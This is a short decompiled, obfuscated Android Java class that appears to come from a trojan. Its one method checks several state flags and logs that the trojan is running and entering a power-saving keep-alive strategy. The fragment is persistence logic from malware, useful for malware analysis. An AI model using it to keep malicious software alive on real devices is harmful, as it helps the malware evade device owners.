package w;

import android.util.Log;
import h.e;
import java.util.concurrent.atomic.AtomicBoolean;

public abstract class a {
   public static final AtomicBoolean a = new AtomicBoolean(false);

   public static boolean a() {
      if (a.get() && e.S() != null && e.S().U() && e.S().D() && e.S().B.get()) {
         Log.d("PowerSaveManager", "木马正在运行,进入省电模式保活策略");
         return true;
      } else {
         return false;
      }
   }
}
